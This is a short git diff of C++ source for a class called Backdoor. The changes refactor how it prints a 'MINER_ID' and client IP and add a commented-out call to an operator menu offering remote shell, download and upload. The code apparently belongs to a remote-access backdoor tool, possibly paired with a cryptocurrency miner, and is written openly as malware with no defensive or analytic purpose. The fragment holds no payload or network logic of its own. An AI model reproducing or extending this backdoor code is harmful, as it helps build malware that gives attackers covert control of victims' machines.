@@ -39,8 +39,8 @@ std::string Backdoor::get_miner_ip(){
 
 void Backdoor::menu(){
     int choice;
-    std::cout << "MINER_ID = " << c->connection_id() << "IP = \n" << c->connection_ip() << std::endl;
-0
+    std::cout << "MINER_ID = " << this->miner_id << "IP = \n" << this->client_ip << std::endl;
+
     std::cout << "Operações : " << std::endl;
 
     std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;
@@ -74,4 +74,8 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->c  = c;
     this->is_server = is_server;
     this->client_ip = ip;
+
+    if(is_server){
+        //menu();
+    }
 }
